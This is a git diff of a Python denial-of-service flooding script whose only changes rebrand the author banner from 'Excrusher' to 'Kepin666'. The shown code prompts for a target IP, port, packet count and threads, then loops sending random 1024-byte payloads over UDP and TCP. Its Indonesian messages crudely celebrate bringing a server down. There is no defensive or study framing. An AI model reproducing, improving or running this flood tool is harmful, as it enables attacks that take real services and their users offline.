@@ -8,14 +8,14 @@ import threading
 import os
 
 os.system("clear")
-print("DDoSaTtack by Excrusher")
+print("DDoSaTtack by Kepin666")
 print("Kalau Mau Pakek Ganteng Dulu")
-print("Mau rename? Pm Sanzo ")
-ip = str(input(" DdosAttackByExcrusher | Ip:"))
-port = int(input(" DdosAttackByExcrusher | Port:"))
-choice = str(input(" DdosAttackByExcrusher | Gas Gak Ni?(y/n):"))
-times = int(input(" DdosAttackByExcrusher | Packets:"))
-threads = int(input(" DdosAttackByExcrusher | Threads:"))
+print("Mau rename? Pm Saya ")
+ip = str(input(" DdosAttackByKepin | Ip:"))
+port = int(input(" DdosAttackByKepin | Port:"))
+choice = str(input(" DdosAttackByKepin | Gas Gak Ni?(y/n):"))
+times = int(input(" DdosAttackByKepin | Packets:"))
+threads = int(input(" DdosAttackByKepin | Threads:"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -25,7 +25,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" | EXCRUSHER |")
+			print(i +" | KEPIN666 |")
 		except:
 			print("[!] | Server down kontol!!! |")
 
@@ -39,7 +39,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" EXCRUSHER nih bos!!!")
+			print(i +" KEPIN666 nih bos!!!")
 		except:
 			s.close()
 			print("[*] Down lagi kontol")
